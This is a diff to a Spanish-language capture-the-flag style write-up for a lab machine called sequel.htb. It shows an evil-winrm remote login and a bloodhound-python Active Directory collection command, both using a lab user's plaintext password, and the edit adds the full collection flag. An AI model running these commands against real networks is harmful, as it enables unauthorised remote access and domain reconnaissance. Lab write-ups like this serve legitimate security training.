@@ -276,7 +276,7 @@ evil-winrm -i 10.128.232.128 -u ryan -p WqSZAF6CysDQbGb3
 
 Desde fuera en nuestra maquina atacante nos hacemos una recoleccion de informacion para pasarla a [[BLOODHOUND]]
 ```shell
-bloodhound-python -d sequel.htb -ns 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' --zip
+bloodhound-python -d sequel.htb -ns 10.129.232.128 -u 'ryan' -p 'WqSZAF6CysDQbGb3' -c ALL --zip
 ```
 
 Se lo pasamos a [[BLOODHOUND]]
